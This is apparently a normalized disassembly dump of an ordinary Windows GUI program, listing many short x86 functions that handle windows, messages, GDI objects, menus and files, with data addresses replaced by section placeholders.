call sub_440bd0
retn
sub_43be48
retn
sub_43bf27
mov eax r--data
retn
sub_43c0c4
push esi
mov esi ecx
push 0x1
call sub_440b18
test eax eax
je r-xdata
pop esi
retn
mov ecx esi
call sub_43e71a
j_sub_43e71a#2
jmp sub_43e71a
sub_43c0e0
call sub_43e71a
retn 0x4
sub_43c0e8
mov eax r--data
retn
sub_43c295
retn 0x4
sub_43c396
mov eax ecx
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_43c3a3
push esi
mov esi ecx
call sub_43c3bf
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_43c3bf
mov eax sub_4631c8
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_43c412
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_43c412
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_43c3e8
push eax
call [ ImageList_Destroy@IAT ]
retn
xor eax eax
retn
sub_43c428
push 0x0
call sub_43c324
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
push [ esp + 0x4 ]
add ecx 0x4
call sub_43d531
sub_43c446
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
retn 0x4
sub_43c458
push 0x1
pop eax
retn 0x4
sub_43c45e
xor eax eax
retn 0x4
sub_43c4db
mov ecx [ ebp - 0x14 ]
call sub_442f87
mov eax sub_43c4e9
retn
sub_43c4e9
mov eax 0x8000ffff
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_43c534
mov ecx [ ebp - 0x14 ]
call sub_442f87
mov eax sub_43c542
retn
sub_43c542
mov eax 0x8000ffff
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_43c5b4
mov ecx [ ebp + 0x8 ]
call sub_442f87
mov eax sub_43c5c2
retn
sub_43c5c2
mov eax 0x8000ffff
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x14
sub_43c5d8
mov eax 0x80004001
retn 0x18
sub_43c5e0
mov eax 0x80004001
retn 0x8
sub_43c5e8
mov eax 0x80004001
retn 0x4
sub_43c5f0
mov eax 0x80004001
retn 0xc
sub_43c5f8
mov eax r--data
retn
sub_43c637
push esi
mov esi ecx
call sub_43c6a8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_43c77d
push 0x0
push 0x0
push 0x401
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
xor eax eax
retn 0x8
sub_43c794
push 0x0
push [ esp + 0x8 ]
push 0x401
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
retn 0x4
sub_43c8c1
push 0x1
push [ esp + 0x8 ]
call sub_43c81e
retn 0x4
sub_43c951
push [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
call sub_43c961
retn 0x8
sub_43cdcd
mov eax ecx
xor ecx ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x14 ] ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x18 ] ecx
retn 0x4
sub_43cdf0
push esi
mov esi ecx
call sub_43ce2c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_43ce2c
mov eax sub_464068
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_43ce0c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_43cead
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
retn 0x4
call sub_43ce0c
sub_43cf97
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_43cfae
push esi
mov esi ecx
call sub_43cfca
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_43d163
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
add eax 0x4
push eax
call sub_441e89
pop ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov [ eax ] edx
mov [ ecx ] eax
retn 0xc
sub_43d183
test ecx ecx
je r-xdata
retn
push esi
mov esi [ ecx ]
push ecx
call sub_441eb2
pop ecx
test esi esi
mov ecx esi
jne r-xdata
pop esi
sub_43d199
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_43d1b0
push esi
mov esi ecx
call sub_43d1cc
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_43d429
push esi
mov esi ecx
call sub_43d470
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_43d470
mov eax sub_463f64
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_43d445
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_43d4e6
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
retn 0x4
call sub_43d445
sub_43d68a
mov eax ecx
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x8 ] 0x11
mov [ eax + 0x18 ] ecx
retn 0x4
sub_43d6b1
push esi
mov esi ecx
call sub_43d764
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_43d764
mov eax sub_4640cc
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_43d712
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_43d925
mov eax r--data
retn
sub_43da6b
push esi
mov esi ecx
call sub_43da87
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_43db14
push esi
mov esi ecx
push [ esp + 0x8 ]
call [ LockResource@IAT ]
push [ esp + 0x10 ]
mov ecx esi
push 0x0
push [ esp + 0x14 ]
push eax
call sub_43db37
pop esi
retn 0xc
sub_43dd2e
mov ecx [ ebp - 0x2c ]
call sub_442f87
mov eax [ ebp - 0x24 ]
or [ eax + 0x2c ] 0xffffffff
mov eax r-xdata
retn
sub_43ddc8
mov eax [ esp + 0x4 ]
push 0x1
mov [ ecx + 0x58 ] eax
pop eax
retn 0x4
sub_43df83
mov ecx [ ebp - 0x24 ]
call sub_442f87
mov eax [ ebp - 0x1c ]
or [ eax + 0x2c ] 0xffffffff
mov eax r-xdata
retn
sub_43e031
retn
sub_43e110
retn 0x4
sub_43e178
push esi
mov esi ecx
push 0x1
call sub_440b18
test eax eax
je r-xdata
pop esi
retn
push 0x1
mov ecx esi
call sub_43dfea
sub_43e191
push 0x2
call sub_43dfea
retn
sub_43e215
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_440a38
retn 0xc
sub_43e267
mov eax [ ecx + 0x3c ]
test eax eax
je r-xdata
xor eax eax
add eax 0x20000
jmp r-xdata
retn 0x8
j_sub_43e27f
jmp sub_43e27f
sub_43e27f
push r--data
call [ RegisterWindowMessageA@IAT ]
mov [ rw-data ] eax
retn
sub_43e290
call sub_43e29a
jmp sub_43e2a7
sub_43e29a
push 0x0
mov ecx rw-data
call sub_43e3c6
retn
sub_43e2a7
push sub_43e2b3
call sub_42d719
pop ecx
retn
sub_43e2b3
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_43ee41
sub_43e2ce
call sub_43e2d8
jmp sub_43e2e5
sub_43e2d8
push 0x1
mov ecx rw-data
call sub_43e3c6
retn
sub_43e2e5
push sub_43e2f1
call sub_42d719
pop ecx
retn
sub_43e2f1
test [ rw-data ] 0x2
jne r-xdata
retn
or [ rw-data ] 0x2
mov ecx rw-data
jmp sub_43ee41
sub_43e30c
call sub_43e316
jmp sub_43e323
sub_43e316
push 0xffffffff
mov ecx rw-data
call sub_43e3c6
retn
sub_43e323
push sub_43e32f
call sub_42d719
pop ecx
retn
sub_43e32f
test [ rw-data ] 0x4
jne r-xdata
retn
or [ rw-data ] 0x4
mov ecx rw-data
jmp sub_43ee41
sub_43e34a
call sub_43e354
jmp sub_43e361
sub_43e354
push 0xfffffffe
mov ecx rw-data
call sub_43e3c6
retn
sub_43e361
push sub_43e36d
call sub_42d719
pop ecx
retn
sub_43e36d
test [ rw-data ] 0x8
jne r-xdata
retn
or [ rw-data ] 0x8
mov ecx rw-data
jmp sub_43ee41
sub_43e3aa
push esi
mov esi ecx
call sub_43ee41
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_43e441
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0xfffffff0
push [ esp + 0x14 ]
call sub_43e3f2
retn 0x10
sub_43e45b
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0xffffffec
push [ esp + 0x14 ]
call sub_43e3f2
retn 0x10
sub_43e475
push esi
mov esi [ esp + 0x8 ]
push [ esp + 0xc ]
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov ecx esi
call sub_44163f
mov ecx [ esp + 0x10 ]
pop esi
mov [ ecx ] eax
retn 0xc
sub_43edd5
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x28 ] 0x0
jne r-xdata
push 0x1
pop eax
pop esi
retn 0x4
push 0x1
call sub_44121e
mov [ esi + 0x28 ] r--data
sub_43efed
cmp [ ecx + 0x1c ] 0x0
mov eax [ ecx ]
je r-xdata
jmp [ eax + 0xa4 ]
jmp [ eax + 0x58 ]
sub_43f092
lea eax [ ecx + 0x28 ]
retn
sub_43f096
push esi
mov esi ecx
call sub_45357b
mov eax [ eax + 0x1034 ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn 0x4
push esi
push [ esp + 0xc ]
call eax
sub_43f22c
mov eax [ esp + 0x8 ]
push esi
push 0x0
mov esi ecx
push [ eax + 0xc ]
call sub_44057e
test eax eax
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_43e71a
sub_43f5cf
mov eax r--data
retn
sub_43fbcb
push esi
mov esi ecx
call sub_441c49
mov [ esi ] r--data
mov [ esi + 0x28 ] 0x1
mov eax esi
pop esi
retn
sub_43fbe4
mov eax [ esp + 0x4 ]
mov [ ecx + 0x18 ] 0x1
mov [ ecx + 0x28 ] eax
retn 0x4
sub_43ffc4
xor eax eax
retn 0x4
sub_440792
cmp [ esp + 0x4 ] 0x0
jne r-xdata
xor eax eax
retn 0x8
call sub_453349
test [ eax + 0xdf ] 0x40
jne r-xdata
push 0x1
call sub_43f0b5
sub_440b10
mov eax 0xffff
retn 0x8
sub_440b76
mov eax r-xdata
retn
sub_440b7c
mov esi [ ebp - 0x1c ]
push 0xf108
push 0x30
mov ecx esi
mov eax [ esi ]
call [ eax + 0x10 ]
mov ecx esi
call sub_442f87
mov eax r-xdata
retn
sub_440bba
mov eax ecx
mov ecx [ esp + 0x8 ]
and [ eax + 0x8 ] 0x0
mov [ eax ] ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
retn 0x8
sub_44113b
mov eax [ ecx + 0x24 ]
and eax 0x10
retn
sub_4414d5
mov eax [ ecx + 0x90 ]
test eax eax
je r-xdata
xor eax eax
retn
cmp eax 0xe002
je r-xdata
cmp eax 0xe001
je r-xdata
push 0x1
pop eax
retn
sub_44155f
push [ esp + 0x4 ]
mov ecx rw-data
call sub_4265e3
retn
sub_44156e
push [ esp + 0xc ]
mov ecx [ ecx + 0x34 ]
push [ esp + 0xc ]
mov eax [ ecx ]
push [ esp + 0xc ]
call [ eax + 0x54 ]
retn 0xc
sub_4416d5
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
push [ esp + 0x4 ]
mov ecx eax
call [ edx + 0x80 ]
push [ esp + 0x4 ]
push [ ecx + 0x1c ]
call [ SetWindowTextA@IAT ]
jmp r-xdata
retn 0x4
sub_44172b
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x90 ]
push [ ecx + 0x1c ]
call [ GetDlgCtrlID@IAT ]
retn
sub_441868
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0xac ]
push [ ecx + 0x1c ]
call [ SetFocus@IAT ]
push eax
call sub_43e7b3
retn
sub_4418b0
cmp [ ecx + 0x38 ] 0x0
je r-xdata
retn 0xc
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0x2
push [ esp + 0x14 ]
push ecx
call sub_441889
add esp 0x18
sub_44190f
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
retn 0x4
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
mov edx [ eax ]
push ecx
mov ecx eax
call [ edx + 0x8c ]
sub_44195c
mov eax ecx
push 0x1
pop ecx
xor edx edx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
retn
sub_441bb7
push 0x1
pop eax
retn 0x4
sub_441bbd
mov eax 0x80029c4a
retn 0x8
sub_441bc5
call sub_45357b
mov eax [ eax + 0x4 ]
push 0x1
mov ecx eax
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_441bef
mov eax r--data
retn
sub_441bf5
mov eax r--data
retn
sub_441bfb
mov eax r--data
retn
sub_441c01
mov eax r--data
retn
sub_441c39
push 0x1
pop eax
retn
sub_441c3d
mov eax r--data
retn
sub_441c43
mov eax r--data
retn
sub_441e6f
call sub_43b7b5
xor eax eax
retn
sub_441ef0
call sub_441efa
jmp sub_441f09
sub_441efa
push 0x40
push 0x50
mov ecx rw-data
call sub_4264f0
retn
sub_441f09
push sub_441f15
call sub_42d719
pop ecx
retn
sub_441f15
mov ecx rw-data
jmp sub_426518
sub_441f1f
call sub_441f29
jmp sub_441f3b
sub_441f29
push 0x40
push 0x90
mov ecx rw-data
call sub_4264f0
retn
sub_441f3b
push sub_441f47
call sub_42d719
pop ecx
retn
sub_441f47
mov ecx rw-data
jmp sub_426518
sub_441f51
call sub_441f5b
jmp sub_441f6d
sub_441f5b
push 0x40
push 0x110
mov ecx rw-data
call sub_4264f0
retn
sub_441f6d
push sub_441f79
call sub_42d719
pop ecx
retn
sub_441f79
mov ecx rw-data
jmp sub_426518
sub_441f83
call sub_441f8d
jmp sub_441f9f
sub_441f8d
push 0x40
push 0x210
mov ecx rw-data
call sub_4264f0
retn
sub_441f9f
push sub_441fab
call sub_42d719
pop ecx
retn
sub_441fab
mov ecx rw-data
jmp sub_426518
sub_4420b0
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
pop esi
retn 0x4
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx esi
call sub_442037
sub_44260f
push esi
mov esi ecx
push 0x0
call sub_442578
mov ecx [ esi ]
pop esi
or [ ecx - 0xc ] 0xffffffff
retn
sub_44267c
push esi
mov esi ecx
call sub_4420f1
push [ esi ]
call sub_42e7cf
pop ecx
pop esi
retn
sub_44268e
push esi
mov esi ecx
call sub_4420f1
mov eax [ esi ]
mov edx [ esp + 0x8 ]
mov cl [ esp + 0xc ]
pop esi
mov [ eax + edx ] cl
retn 0x8
sub_442712
mov eax r--data
retn
sub_442973
cmp [ ecx + 0x24 ] 0x0
je r-xdata
retn
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_442985
xor eax eax
retn
sub_442a60
mov eax [ ecx + 0x38 ]
retn
sub_442e59
mov eax [ ecx + 0x20 ]
test eax eax
jne r-xdata
retn
mov eax [ ecx + 0x1c ]
test eax eax
jne r-xdata
call [ GetActiveWindow@IAT ]
push eax
call sub_43e7b3
sub_442eb4
mov eax r--data
retn
sub_442ecc
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
call sub_442eba
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
retn
sub_442f24
mov ecx [ ebp - 0x18 ]
call sub_442f87
mov eax r-xdata
retn
sub_442f32
push esi
call sub_45357b
push 0x0
mov esi eax
call sub_45565c
lea ecx [ esi + 0x1c ]
push [ esp + 0x8 ]
call sub_454d1e
push 0x0
call sub_4556cc
pop esi
retn 0x4
sub_442f58
test ecx ecx
je r-xdata
xor eax eax
cmp ecx [ esp + 0x4 ]
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx [ ecx + 0x10 ]
jmp sub_442f58
retn 0x4
sub_442f71
mov eax ecx
mov [ eax + 0x4 ] 0x1
retn
sub_442f7b
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
retn 0x4
sub_442f87
cmp [ ecx + 0x4 ] 0x0
jle r-xdata
retn
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_44307d
mov eax [ ecx ]
test eax eax
je r-xdata
retn
push eax
call [ GlobalFree@IAT ]
sub_44308b
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_4433b9
call sub_4535a1
inc [ eax + 0x10 ]
retn
sub_443768
push 0x0
call sub_4436e1
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
push [ esp + 0x4 ]
add ecx 0x4
call sub_43d531
sub_4437b0
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_443786
push eax
call [ DestroyMenu@IAT ]
retn
xor eax eax
retn
sub_443a72
push esi
mov esi ecx
call sub_443ad9
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_44401e
mov eax ecx
mov ecx [ rw-data ]
mov [ eax + 0xc ] ecx
or [ eax + 0x4 ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_444038
push esi
mov esi ecx
call sub_444073
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_444054
mov eax ecx
mov ecx [ rw-data ]
mov [ eax + 0xc ] ecx
mov ecx [ esp + 0x4 ]
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
retn 0x4
sub_44432a
mov eax [ ecx + 0x4 ]
cmp eax 0xffffffff
je r-xdata
retn
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
push eax
call [ GetLastError@IAT ]
push eax
call sub_444ac1
sub_44438c
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
lea ecx [ esi + 0xc ]
call sub_4420d3
pop esi
retn
push eax
call [ CloseHandle@IAT ]
or [ esi + 0x4 ] 0xffffffff
sub_444457
xor eax eax
retn 0x10
sub_44445c
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call [ MoveFileA@IAT ]
test eax eax
jne r-xdata
retn 0x8
push eax
call [ GetLastError@IAT ]
push eax
call sub_444ac1
sub_445253
mov eax [ ecx + 0x1c ]
push 0x0
push 0x0
push 0x10
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
retn
sub_445266
push esi
mov esi ecx
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_448137
and [ esi + 0x64 ] 0x0
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x10
sub_44528e
push esi
mov esi ecx
call sub_4452aa
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_4452aa
mov [ ecx ] r--data
jmp sub_4482dc
sub_4452b5
mov eax [ ecx + 0x64 ]
neg eax
sbb eax eax
retn
sub_4452bd
mov edx [ esp + 0x4 ]
xor eax eax
cmp [ edx ] 0xffffffff
jne r-xdata
and [ edx ] 0x0
retn 0x4
mov eax [ ecx + 0x64 ]
sub_4452d1
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_44834d
mov [ esi + 0x64 ] edi
pop edi
pop esi
retn 0x4
sub_4452e7
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_448357
and [ esi + 0x64 ] 0x0
pop esi
retn 0x4
sub_4455c9
mov eax [ ecx ]
jmp [ eax + 0x7c ]
sub_4455ef
push esi
mov esi ecx
push [ esp + 0x8 ]
lea ecx [ esi + 0x1c ]
call sub_4422d1
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa0 ]
pop esi
retn 0x4
sub_44560c
retn
sub_44560d
cmp [ ecx + 0x34 ] 0x0
jne r-xdata
mov eax [ ecx ]
jmp [ eax + 0xa0 ]
cmp [ ecx + 0x48 ] 0x0
je r-xdata
mov eax [ ecx ]
jmp [ eax + 0x7c ]
sub_44575c
retn 0x4
sub_4457db
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x90 ]
test eax eax
je r-xdata
pop esi
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x7c ]
sub_4457f3
mov eax [ ecx ]
jmp [ eax + 0x9c ]
sub_445958
mov ecx [ ebp + 0xc ]
call sub_442f87
mov eax sub_445966
retn
sub_445ac3
xor eax eax
retn
sub_445e7f
push esi
mov esi ecx
call sub_44438c
mov eax [ esi + 0x10 ]
pop esi
cmp [ eax - 0x8 ] 0x0
je r-xdata
retn
push eax
call sub_44447e
sub_4460e8
push esi
mov esi ecx
call sub_446104
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_44630c
mov ecx [ ebp - 0x18 ]
call sub_442f87
mov eax r-xdata
retn
sub_4464b2
mov ecx [ ebp - 0x18 ]
call sub_442f87
mov eax r-xdata
retn
sub_44659e
mov eax [ ecx + 0x2c ]
retn
sub_4465a2
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
test eax eax
je r-xdata
retn 0x4
mov edx [ eax ]
mov [ ecx ] edx
mov eax [ eax + 0x8 ]
sub_4465f9
push esi
mov esi ecx
call sub_43e388
and [ esi + 0x3c ] 0x0
mov eax esi
pop esi
retn
sub_4466fa
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_44683f
mov edx [ ecx ]
xor eax eax
push eax
push eax
push eax
call [ edx + 0xec ]
retn
sub_44684d
push 0x1
push 0x0
push [ ecx + 0x1c ]
call [ InvalidateRect@IAT ]
retn 0xc
sub_44685d
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0xf0 ]
retn 0x8
sub_44686c
xor eax eax
retn 0x4
sub_446871
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je r-xdata
pop esi
retn 0xc
call sub_43fdea
test eax eax
je r-xdata
mov ecx esi
call sub_441868
sub_44688f
retn 0x8
sub_446903
xor eax eax
retn 0xc
sub_446908
mov eax 0x80000000
retn 0xc
sub_446910
xor eax eax
retn 0x10
sub_446915
or eax 0xffffffff
retn 0x14
sub_446a16
push 0x0
push ecx
call sub_44691b
test eax eax
je r-xdata
retn 0x4
mov edx [ eax ]
mov ecx eax
call [ edx + 0xf0 ]
push 0x1
pop eax
sub_446abf
push 0x1
pop eax
retn 0x4
sub_446b68
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_446b7c
push esi
mov esi ecx
call sub_446c9d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_446c0a
push 0x1
call sub_446b98
mov ecx eax
push [ esp + 0x4 ]
call sub_443521
retn 0x4
sub_446c87
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_446c56
push eax
call [ DeleteDC@IAT ]
retn
xor eax eax
retn
sub_446cd3
mov eax [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
retn 0x4
sub_446cdd
mov eax [ esp + 0x4 ]
mov [ ecx + 0x4 ] eax
retn 0x4
sub_446ce7
and [ ecx + 0x8 ] 0x0
retn
sub_446cec
and [ ecx + 0x4 ] 0x0
retn
sub_446d60
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call [ SelectObject@IAT ]
push eax
call sub_44774c
retn 0x8
sub_447169
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ GetClipBox@IAT ]
retn 0x4
sub_44750f
push esi
mov esi ecx
call sub_44752b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_4475c3
push esi
mov esi ecx
call sub_4475df
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_447677
push esi
mov esi ecx
call sub_447693
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_447818
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push r--data
push eax
mov [ ebp - 0x4 ] rw-data
call sub_42dca7
sub_4479eb
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn 0x4
push eax
call [ DeleteObject@IAT ]
and [ esi ] 0x0
sub_447c67
push esi
mov esi ecx
call sub_447e14
and [ esi + 0x20 ] 0x0
pop esi
retn
sub_448337
mov ecx [ ecx + 0x60 ]
push 0xa
push [ esp + 0xc ]
push ecx
push [ esp + 0x10 ]
call sub_443871
retn 0x8
sub_44834d
mov eax [ esp + 0x4 ]
mov [ eax + 0x24 ] ecx
retn 0x4
sub_448357
mov eax [ esp + 0x4 ]
and [ eax + 0x24 ] 0x0
retn 0x4
sub_4484a7
push [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push [ esp + 0xc ]
call sub_44fd22
retn 0xc
sub_448812
push esi
mov esi ecx
call sub_44882e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_44882e
mov [ ecx ] r--data
jmp sub_446609
sub_4493ab
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_4493c2
mov [ esi + 0xc ] 0x1
pop esi
retn 0x4
sub_4497e4
call sub_453349
mov eax [ eax + 0xc4 ]
retn
sub_449818
mov eax [ esp + 0x4 ]
mov ecx [ ecx + 0x5c ]
lea eax [ eax + eax * 4 ]
mov eax [ ecx + eax * 4 + 0x8 ]
retn 0x4
sub_44991f
mov eax r-xdata
retn
sub_4499fb
mov eax r--data
retn
sub_449a01
call sub_43e71a
sub eax 0x11
neg eax
sbb eax eax
and al 0xf0
add eax 0x11
retn 0x8
sub_449aa8
push esi
push 0x1
mov esi ecx
push 0x0
call sub_4539dc
mov ecx esi
call sub_43e71a
pop esi
retn
sub_449abd
push esi
mov esi ecx
call sub_43e71a
push 0x0
push 0x1
mov ecx esi
call sub_4539dc
pop esi
retn 0xc
sub_449b78
push esi
mov esi ecx
call sub_43e71a
mov ecx [ esp + 0x8 ]
mov [ esi + 0x78 ] ecx
pop esi
retn 0x8
sub_449bf2
push 0x1
push [ esp + 0x8 ]
push [ ecx + 0x8 ]
mov ecx [ ecx + 0x14 ]
call sub_44987b
retn 0x4
sub_449de6
mov eax [ ecx ]
push esi
mov esi [ esp + 0xc ]
push esi
push [ esp + 0xc ]
push 0x417
call [ eax + 0xa0 ]
xor [ esi + 0x8 ] 0x4
pop esi
retn 0x8
sub_449ef4
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_449de6
mov eax [ ebp - 0x10 ]
leave
retn 0x4
sub_44a7be
mov eax r--data
retn
sub_44a7c4
call sub_43e71a
retn 0x4
sub_44a7cc
push 0x1
pop eax
retn 0x8
sub_44a8a1
push esi
mov esi ecx
cmp [ esi + 0x84 ] 0x0
je r-xdata
mov ecx esi
call sub_43e71a
pop esi
retn
call sub_449f47
sub_44a8bb
push [ esp + 0x8 ]
lea eax [ ecx + 0x90 ]
push eax
call sub_44a8e1
retn 0x8
